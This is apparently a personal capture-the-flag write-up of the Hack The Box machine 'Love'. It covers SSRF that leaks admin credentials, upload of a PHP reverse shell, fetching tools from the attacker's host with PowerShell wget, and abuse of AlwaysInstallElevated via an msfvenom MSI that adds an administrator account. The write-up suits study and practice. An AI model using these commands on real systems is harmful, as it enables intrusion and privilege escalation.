# Getting User
## Web Apps
So, there's a web application running on port 80, 443, and 5000. 443 and 5000 show not authorised but port 80 seems ok. 
Run a gobuster and can find a few urls, one of which is /admin. Can't use this yet as we don't have the creds but maybe Roy is the user? We don't have a password for him yet so will have to come back to this. The other paths don't really get us anywhere.

Nmap shows different subdomains on port 5000, add them to the /etc/hosts file. Trying them on port 80 and staging.love.htb works here too. The Demo link has a scan file function which can be used to connect back to your own web server. 
![[Pasted image 20210805192244.png]]
try html tags - no dice

try some php:
```php 
<?php
$cmd = 'set';
echo "<pre>".shell_exec($cmd)."</pre>";
?>
```

![[Pasted image 20210805193243.png]]
Hmm.. that's weird looks like it's done some weird validation or something so not going to execute code either by looks of it.

Well we can always try Server-Side Request Forgery... let's try http://localhost/index.php 
![[Pasted image 20210805193653.png]] 
Ah ha! This displays the index page within the page, so we now know this works. So, try the pages on the other ports:

### Port 443
Doesn't work.

### Port 5000
![[Pasted image 20210731215807.png]]

Nice, we have creds: admin:@LoveIsInTheAir!!!!

Navigate to http://love.htb/admin and login using the creds:
![[Pasted image 20210731220226.png]]

We can upload files to the server via the update user image functionality. We know from earlier enumeration there is an images directory so once we upload a shell, we can navigate to it in the images path.

Using this shell https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php, amend the bottom of the script to add in your IP and port, then upload to the web server in the images dir. The set up nc listener for the port you put in the script and naviagte to it. http://love.htb/images/revshell.php. You'll now have a shell on the box, but after a few minutes it dies. This is probably because the web server kills the connection as it probably sees it as stale or timed-out. So we need to work efficiently but that doesn't matter as getting a new shell just means redoing the listener and browsing to the `revshell.php` again.

Ok what user are we:
```
whoami
love\Phoebe
```

Ok nice let's see if this user has the flag we want:
```cmd
cd C:\Users\Phoebe\Desktop
type User.txt
```

Nice! That's the user flag done.

# Getting Adminstrator
After hunting around the box for any new creds I didn't find any so time to upload winPEAS.

```bash 
cd HTB/Boxes/Love/www
python3 -m http.server 80
```

Now on the box within our shell:
```cmd
cd C:\xampp\tmp

powershell wget http://10.10.14.7/winPEAS.bat - o winPEAS.bat
```
*Note: you can upload it to any location you want I just chose C:\\xampp\\tmp because it's a temporary directory and probably won't get checked by an admin of the box... IF they were checking*

Now let's run this and see what we get: `C:\\xampp\\tmp>winPEAS.bat`
```cmd
[...SNIP...]
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AlwaysInstallElevated? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_- 
[i] If '1' then you can install a .msi file with admin privileges ;) 
	[?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated 
	
	HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated REG_DWORD 0x1
	
	HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated REG_DWORD 0x1
[...SNIP...]
```

Now this is interesting, as we can see here the registry entries allow us to install a `.msi` file as Administrator. What this means is we can create a `.msi` file that can... well... do what ever we want really, like getting the contents of a file or add a user with admin privileges. Let's do this by adding a user instead of just hitting the **root.txt** file.

There's a good guide in the hacktricks website mentioned above so let's use that. First let's create our own `.msi` file to add a user. To do this we can use MSFVenom:
`msfvenom -p windows/adduser USER=vosman PASS=P@ssword123! -f msi -o alwe.msi`

Upload to the server:
`powershell wget http://10.10.14.8:8000/alwe.msi -o expl.msi`
Now run the command to install the MSI file:

`msiexec /quiet /qn /i expl.msi`
`net user`
![[Pasted image 20210802202304.png]]
![[Pasted image 20210802202351.png]]
Nice that added my user and added me to the Administrators group.

Now let's do a PowerShell remote session as Vosman:
```bash
Kali:~/HTB/Boxes/Love# pwsh
PowerShell 7.1.3                                       
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell

PS /root/HTB/Boxes/Love> $pass = ConvertTo-SecureString 'P@ssword123!' -asplaintext -force
PS /root/HTB/Boxes/Love> $cred = New-Object System.Management.Automation.PSCredential('love\vosman', $pass)
PS /root/HTB/Boxes/Love> $cred

UserName                        Password                                                                                                                                                                                       
--------                        -------- 
love\vosman System.Security.SecureString

PS /root/HTB/Boxes/Love> Enter-PSSession -Computer 10.10.10.239 -credential $cred

Enter-PSSession: MI_RESULT_ACCESS_DENIED

PS /root/HTB/Boxes/Love> Enter-PSSession -Computer 10.10.10.239 -credential $cred -Authentication Negotiate
Enter-PSSession: Connecting to remote server 10.10.10.239 failed with the following error message: acquiring creds with username only failed Unspecified GSS failure.  Minor code may provide more information SPNEGO cannot find mechanisms to negotiate for more information, see the about_Remote_Troubleshooting Help topic.

PS /root/HTB/Boxes/Love> apt install gss-ntlmssp
```

Once the bugs are fixed:
`Enter-PSSession -Computer 10.10.10.239 -credential $cred -Authentication Negotiate`

![[Pasted image 20210802202655.png]]

Job Done!
Vosman @vosNETCyber